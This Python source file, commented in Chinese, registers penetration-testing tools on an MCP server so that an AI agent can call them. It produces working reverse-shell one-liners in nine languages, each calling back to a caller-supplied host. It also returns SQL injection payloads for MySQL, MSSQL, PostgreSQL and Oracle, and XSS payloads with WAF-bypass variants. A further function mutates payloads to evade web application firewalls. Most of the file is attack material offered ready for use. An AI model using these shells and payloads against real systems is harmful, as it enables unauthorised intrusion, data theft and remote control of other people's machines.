#!/usr/bin/env python3
"""
Payload工具模块 - Payload生成和变异相关功能
包含: 反向Shell生成、SQL注入Payload、XSS Payload、智能Payload变异
"""

import re
from typing import Any, Tuple

# 输入验证模式
# IPv4 地址
_IPV4_PATTERN = re.compile(
    r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}"
    r"(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$"
)

# IPv6 地址（简化版）
_IPV6_PATTERN = re.compile(r"^([0-9a-fA-F]{0,4}:){2,7}[0-9a-fA-F]{0,4}$")

# 主机名（RFC 1123）
_HOSTNAME_PATTERN = re.compile(
    r"^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)*"
    r"[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$"
)

# 危险字符（用于命令注入检测）
_DANGEROUS_CHARS = frozenset(
    [";", "|", "&", "$", "`", "\n", "\r", ">", "<", "'", '"', "\\", "(", ")", "{", "}"]
)


def _validate_host(host: str) -> Tuple[bool, str]:
    """验证主机地址是否安全"""
    if not host or not isinstance(host, str):
        return False, "主机地址不能为空"

    host = host.strip()

    if len(host) > 253:
        return False, "主机地址过长"

    for char in _DANGEROUS_CHARS:
        if char in host:
            return False, f"主机地址包含非法字符: {repr(char)}"

    if _IPV4_PATTERN.match(host) or _IPV6_PATTERN.match(host) or _HOSTNAME_PATTERN.match(host):
        return True, ""

    return False, "无效的主机地址格式"


def _validate_port(port: Any) -> Tuple[bool, str]:
    """验证端口号是否有效"""
    try:
        port_int = int(port)
    except (ValueError, TypeError):
        return False, "端口必须是整数"

    if port_int < 1 or port_int > 65535:
        return False, "端口必须在 1-65535 范围内"

    return True, ""


def register_payload_tools(mcp):
    """注册所有Payload工具到 MCP 服务器"""

    @mcp.tool()
    def reverse_shell_gen(lhost: str, lport: int, shell_type: str = "python") -> dict:
        """反向Shell生成器 - 生成各类反向Shell代码"""
        # 输入验证
        valid, error = _validate_host(lhost)
        if not valid:
            return {"success": False, "error": f"无效的监听地址: {error}"}

        valid, error = _validate_port(lport)
        if not valid:
            return {"success": False, "error": f"无效的端口: {error}"}

        lport = int(lport)  # 确保端口为整数

        shells = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python": f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            "python3": f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
            "php": f'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
            "nc": f"nc -e /bin/sh {lhost} {lport}",
            "nc_mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            "powershell": f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            "perl": f'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
            "ruby": f'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        }

        if shell_type not in shells:
            return {"success": False, "error": f"不支持的类型。可用: {list(shells.keys())}"}

        return {"success": True, "type": shell_type, "payload": shells[shell_type]}

    @mcp.tool()
    def sqli_payloads(dbms: str = "mysql", payload_type: str = "union") -> dict:
        """SQL注入Payload生成 - 返回常用Payload"""
        payloads = {
            "mysql": {
                "union": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT NULL,NULL--",
                    "' UNION SELECT 1,2,3--",
                    "' UNION SELECT user(),database(),version()--",
                    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
                ],
                "boolean": ["' AND 1=1--", "' AND 1=2--", "' OR 1=1--", "' AND 'a'='a"],
                "time": [
                    "' AND SLEEP(5)--",
                    "' AND BENCHMARK(10000000,SHA1('test'))--",
                    "'; WAITFOR DELAY '0:0:5'--",
                ],
                "error": [
                    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
                    "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
                ],
            },
            "mssql": {
                "union": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT @@version--",
                    "' UNION SELECT name FROM sysobjects WHERE xtype='U'--",
                ],
                "time": ["'; WAITFOR DELAY '0:0:5'--", "'; IF (1=1) WAITFOR DELAY '0:0:5'--"],
            },
            "postgresql": {
                "union": [
                    "' UNION SELECT NULL--",
                    "' UNION SELECT version()--",
                    "' UNION SELECT table_name FROM information_schema.tables--",
                ],
                "time": ["'; SELECT pg_sleep(5)--", "' AND pg_sleep(5)--"],
            },
            "oracle": {
                "union": [
                    "' UNION SELECT NULL FROM dual--",
                    "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--",
                    "' UNION SELECT table_name FROM all_tables--",
                ],
                "time": ["' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)='x'--"],
            },
        }

        if dbms not in payloads:
            return {"success": False, "error": f"不支持的数据库。可用: {list(payloads.keys())}"}

        db_payloads = payloads[dbms]
        if payload_type not in db_payloads:
            return {"success": False, "error": f"不支持的类型。可用: {list(db_payloads.keys())}"}

        return {
            "success": True,
            "dbms": dbms,
            "type": payload_type,
            "payloads": db_payloads[payload_type],
        }

    @mcp.tool()
    def xss_payloads(context: str = "html") -> dict:
        """XSS Payload生成 - 返回常用Payload"""
        payloads = {
            "html": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                '<iframe src="javascript:alert(1)">',
                "<input onfocus=alert(1) autofocus>",
            ],
            "attribute": [
                '" onmouseover="alert(1)',
                "' onmouseover='alert(1)",
                '" onfocus="alert(1)" autofocus="',
                "javascript:alert(1)",
            ],
            "javascript": [
                "'-alert(1)-'",
                "\\'-alert(1)//",
                "</script><script>alert(1)</script>",
                "';alert(1)//",
                '";alert(1)//',
            ],
            "waf_bypass": [
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                "<img src=x onerror=alert`1`>",
                "<svg/onload=alert(1)>",
                "<%00script>alert(1)</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
            ],
            "dom": [
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "<svg onload=eval(name)>",
                "<body onpageshow=alert(1)>",
                "<details open ontoggle=alert(1)>",
            ],
        }

        if context not in payloads:
            return {"success": False, "error": f"不支持的上下文。可用: {list(payloads.keys())}"}

        return {"success": True, "context": context, "payloads": payloads[context]}

    @mcp.tool()
    def smart_payload(vuln_type: str, payload: str, waf: str = None) -> dict:
        """智能Payload变异 - WAF绕过

        Args:
            vuln_type: 漏洞类型 (sqli/xss/rce等)
            payload: 原始Payload
            waf: WAF类型 (cloudflare/aws_waf/modsecurity等，可选)

        Returns:
            变异后的Payload列表
        """
        try:
            from modules.payload import mutate_payload

            return mutate_payload(payload, waf=waf)
        except ImportError:
            # 如果模块不可用，提供基础变异
            return _basic_payload_mutation(vuln_type, payload)

    # 返回注册的工具列表
    return ["reverse_shell_gen", "sqli_payloads", "xss_payloads", "smart_payload"]


def _basic_payload_mutation(vuln_type: str, payload: str) -> dict:
    """基础Payload变异 - 当smart_payload_engine不可用时的后备"""
    mutations = []

    # URL编码
    import urllib.parse

    mutations.append({"technique": "url_encode", "payload": urllib.parse.quote(payload)})

    # 双重URL编码
    mutations.append(
        {
            "technique": "double_url_encode",
            "payload": urllib.parse.quote(urllib.parse.quote(payload)),
        }
    )

    # 大小写混合
    mutations.append(
        {
            "technique": "case_variation",
            "payload": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)),
        }
    )

    # 空格替换
    space_alternatives = ["%20", "%09", "/**/", "+"]
    for alt in space_alternatives:
        mutations.append({"technique": f"space_to_{alt}", "payload": payload.replace(" ", alt)})

    return {
        "success": True,
        "original": payload,
        "vuln_type": vuln_type,
        "mutations": mutations,
        "note": "使用基础变异模式 (smart_payload_engine 未加载)",
    }
